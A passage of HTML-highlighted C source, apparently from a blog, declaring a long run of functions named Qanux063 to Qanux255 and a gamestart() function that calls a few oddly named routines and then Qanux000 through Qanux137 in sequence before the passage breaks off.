function_">Qanux063</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux064</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux065</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux066</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux067</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux068</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux069</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux070</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux071</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux072</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux073</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux074</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux075</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux076</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux077</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux078</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux079</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux080</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux081</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux082</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux083</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux084</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux085</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux086</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux087</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux088</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux089</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux090</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux091</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux092</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux093</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux094</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux095</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux096</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux097</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux098</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux099</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux100</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux101</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux102</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux103</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux104</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux105</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux106</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux107</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux108</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux109</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux110</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux111</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux112</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux113</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux114</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux115</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux116</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux117</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux118</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux119</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux120</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux121</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux122</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux123</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux124</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux125</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux126</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux127</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux128</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux129</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux130</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux131</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux132</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux133</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux134</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux135</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux136</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux137</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux138</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux139</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux140</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux141</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux142</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux143</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux144</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux145</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux146</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux147</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux148</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux149</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux150</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux151</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux152</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux153</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux154</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux155</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux156</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux157</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux158</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux159</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux160</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux161</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux162</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux163</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux164</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux165</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux166</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux167</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux168</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux169</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux170</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux171</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux172</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux173</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux174</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux175</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux176</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux177</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux178</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux179</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux180</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux181</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux182</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux183</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux184</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux185</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux186</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux187</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux188</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux189</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux190</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux191</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux192</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux193</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux194</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux195</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux196</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux197</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux198</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux199</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux200</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux201</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux202</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux203</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux204</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux205</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux206</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux207</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux208</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux209</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux210</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux211</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux212</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux213</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux214</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux215</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux216</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux217</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux218</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux219</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux220</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux221</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux222</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux223</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux224</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux225</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux226</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux227</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux228</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux229</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux230</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux231</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux232</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux233</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux234</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux235</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux236</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux237</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux238</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux239</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux240</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux241</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux242</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux243</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux244</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux245</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux246</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux247</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux248</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux249</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux250</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux251</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux252</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux253</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux254</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">Qanux255</span><span class="params">(<span class="type">int</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gamestart</span><span class="params">()</span> &#123;</span><br><span class="line">    tiandongwanxiang();</span><br><span class="line">    wuxiangdeyidao();</span><br><span class="line">    guobapenhuo();</span><br><span class="line">    wuxiangdeyidao();</span><br><span class="line">    Qanux000(<span class="number">0</span>);</span><br><span class="line">    Qanux001(<span class="number">1</span>);</span><br><span class="line">    Qanux002(<span class="number">2</span>);</span><br><span class="line">    Qanux003(<span class="number">3</span>);</span><br><span class="line">    Qanux004(<span class="number">4</span>);</span><br><span class="line">    Qanux005(<span class="number">5</span>);</span><br><span class="line">    Qanux006(<span class="number">6</span>);</span><br><span class="line">    Qanux007(<span class="number">7</span>);</span><br><span class="line">    Qanux008(<span class="number">8</span>);</span><br><span class="line">    Qanux009(<span class="number">9</span>);</span><br><span class="line">    Qanux010(<span class="number">10</span>);</span><br><span class="line">    Qanux011(<span class="number">11</span>);</span><br><span class="line">    Qanux012(<span class="number">12</span>);</span><br><span class="line">    Qanux013(<span class="number">13</span>);</span><br><span class="line">    Qanux014(<span class="number">14</span>);</span><br><span class="line">    Qanux015(<span class="number">15</span>);</span><br><span class="line">    Qanux016(<span class="number">16</span>);</span><br><span class="line">    Qanux017(<span class="number">17</span>);</span><br><span class="line">    Qanux018(<span class="number">18</span>);</span><br><span class="line">    Qanux019(<span class="number">19</span>);</span><br><span class="line">    Qanux020(<span class="number">20</span>);</span><br><span class="line">    Qanux021(<span class="number">21</span>);</span><br><span class="line">    Qanux022(<span class="number">22</span>);</span><br><span class="line">    Qanux023(<span class="number">23</span>);</span><br><span class="line">    Qanux024(<span class="number">24</span>);</span><br><span class="line">    Qanux025(<span class="number">25</span>);</span><br><span class="line">    Qanux026(<span class="number">26</span>);</span><br><span class="line">    Qanux027(<span class="number">27</span>);</span><br><span class="line">    Qanux028(<span class="number">28</span>);</span><br><span class="line">    Qanux029(<span class="number">29</span>);</span><br><span class="line">    Qanux030(<span class="number">30</span>);</span><br><span class="line">    Qanux031(<span class="number">31</span>);</span><br><span class="line">    Qanux032(<span class="number">32</span>);</span><br><span class="line">    Qanux033(<span class="number">33</span>);</span><br><span class="line">    Qanux034(<span class="number">34</span>);</span><br><span class="line">    Qanux035(<span class="number">35</span>);</span><br><span class="line">    Qanux036(<span class="number">36</span>);</span><br><span class="line">    Qanux037(<span class="number">37</span>);</span><br><span class="line">    Qanux038(<span class="number">38</span>);</span><br><span class="line">    Qanux039(<span class="number">39</span>);</span><br><span class="line">    Qanux040(<span class="number">40</span>);</span><br><span class="line">    Qanux041(<span class="number">41</span>);</span><br><span class="line">    Qanux042(<span class="number">42</span>);</span><br><span class="line">    Qanux043(<span class="number">43</span>);</span><br><span class="line">    Qanux044(<span class="number">44</span>);</span><br><span class="line">    Qanux045(<span class="number">45</span>);</span><br><span class="line">    Qanux046(<span class="number">46</span>);</span><br><span class="line">    Qanux047(<span class="number">47</span>);</span><br><span class="line">    Qanux048(<span class="number">48</span>);</span><br><span class="line">    Qanux049(<span class="number">49</span>);</span><br><span class="line">    Qanux050(<span class="number">50</span>);</span><br><span class="line">    Qanux051(<span class="number">51</span>);</span><br><span class="line">    Qanux052(<span class="number">52</span>);</span><br><span class="line">    Qanux053(<span class="number">53</span>);</span><br><span class="line">    Qanux054(<span class="number">54</span>);</span><br><span class="line">    Qanux055(<span class="number">55</span>);</span><br><span class="line">    Qanux056(<span class="number">56</span>);</span><br><span class="line">    Qanux057(<span class="number">57</span>);</span><br><span class="line">    Qanux058(<span class="number">58</span>);</span><br><span class="line">    Qanux059(<span class="number">59</span>);</span><br><span class="line">    Qanux060(<span class="number">60</span>);</span><br><span class="line">    Qanux061(<span class="number">61</span>);</span><br><span class="line">    Qanux062(<span class="number">62</span>);</span><br><span class="line">    Qanux063(<span class="number">63</span>);</span><br><span class="line">    Qanux064(<span class="number">64</span>);</span><br><span class="line">    Qanux065(<span class="number">65</span>);</span><br><span class="line">    Qanux066(<span class="number">66</span>);</span><br><span class="line">    Qanux067(<span class="number">67</span>);</span><br><span class="line">    Qanux068(<span class="number">68</span>);</span><br><span class="line">    Qanux069(<span class="number">69</span>);</span><br><span class="line">    Qanux070(<span class="number">70</span>);</span><br><span class="line">    Qanux071(<span class="number">71</span>);</span><br><span class="line">    Qanux072(<span class="number">72</span>);</span><br><span class="line">    Qanux073(<span class="number">73</span>);</span><br><span class="line">    Qanux074(<span class="number">74</span>);</span><br><span class="line">    Qanux075(<span class="number">75</span>);</span><br><span class="line">    Qanux076(<span class="number">76</span>);</span><br><span class="line">    Qanux077(<span class="number">77</span>);</span><br><span class="line">    Qanux078(<span class="number">78</span>);</span><br><span class="line">    Qanux079(<span class="number">79</span>);</span><br><span class="line">    Qanux080(<span class="number">80</span>);</span><br><span class="line">    Qanux081(<span class="number">81</span>);</span><br><span class="line">    Qanux082(<span class="number">82</span>);</span><br><span class="line">    Qanux083(<span class="number">83</span>);</span><br><span class="line">    Qanux084(<span class="number">84</span>);</span><br><span class="line">    Qanux085(<span class="number">85</span>);</span><br><span class="line">    Qanux086(<span class="number">86</span>);</span><br><span class="line">    Qanux087(<span class="number">87</span>);</span><br><span class="line">    Qanux088(<span class="number">88</span>);</span><br><span class="line">    Qanux089(<span class="number">89</span>);</span><br><span class="line">    Qanux090(<span class="number">90</span>);</span><br><span class="line">    Qanux091(<span class="number">91</span>);</span><br><span class="line">    Qanux092(<span class="number">92</span>);</span><br><span class="line">    Qanux093(<span class="number">93</span>);</span><br><span class="line">    Qanux094(<span class="number">94</span>);</span><br><span class="line">    Qanux095(<span class="number">95</span>);</span><br><span class="line">    Qanux096(<span class="number">96</span>);</span><br><span class="line">    Qanux097(<span class="number">97</span>);</span><br><span class="line">    Qanux098(<span class="number">98</span>);</span><br><span class="line">    Qanux099(<span class="number">99</span>);</span><br><span class="line">    Qanux100(<span class="number">100</span>);</span><br><span class="line">    Qanux101(<span class="number">101</span>);</span><br><span class="line">    Qanux102(<span class="number">102</span>);</span><br><span class="line">    Qanux103(<span class="number">103</span>);</span><br><span class="line">    Qanux104(<span class="number">104</span>);</span><br><span class="line">    Qanux105(<span class="number">105</span>);</span><br><span class="line">    Qanux106(<span class="number">106</span>);</span><br><span class="line">    Qanux107(<span class="number">107</span>);</span><br><span class="line">    Qanux108(<span class="number">108</span>);</span><br><span class="line">    Qanux109(<span class="number">109</span>);</span><br><span class="line">    Qanux110(<span class="number">110</span>);</span><br><span class="line">    Qanux111(<span class="number">111</span>);</span><br><span class="line">    Qanux112(<span class="number">112</span>);</span><br><span class="line">    Qanux113(<span class="number">113</span>);</span><br><span class="line">    Qanux114(<span class="number">114</span>);</span><br><span class="line">    Qanux115(<span class="number">115</span>);</span><br><span class="line">    Qanux116(<span class="number">116</span>);</span><br><span class="line">    Qanux117(<span class="number">117</span>);</span><br><span class="line">    Qanux118(<span class="number">118</span>);</span><br><span class="line">    Qanux119(<span class="number">119</span>);</span><br><span class="line">    Qanux120(<span class="number">120</span>);</span><br><span class="line">    Qanux121(<span class="number">121</span>);</span><br><span class="line">    Qanux122(<span class="number">122</span>);</span><br><span class="line">    Qanux123(<span class="number">123</span>);</span><br><span class="line">    Qanux124(<span class="number">124</span>);</span><br><span class="line">    Qanux125(<span class="number">125</span>);</span><br><span class="line">    Qanux126(<span class="number">126</span>);</span><br><span class="line">    Qanux127(<span class="number">127</span>);</span><br><span class="line">    Qanux128(<span class="number">128</span>);</span><br><span class="line">    Qanux129(<span class="number">129</span>);</span><br><span class="line">    Qanux130(<span class="number">130</span>);</span><br><span class="line">    Qanux131(<span class="number">131</span>);</span><br><span class="line">    Qanux132(<span class="number">132</span>);</span><br><span class="line">    Qanux133(<span class="number">133</span>);</span><br><span class="line">    Qanux134(<span class="number">134</span>);</span><br><span class="line">    Qanux135(<span class="number">135</span>);</span><br><span class="line">    Qanux136(<span class="number">136</span>);</span><br><span class="line">    Qanux137(<span class="number">137</span>);</span><br><span class="line">    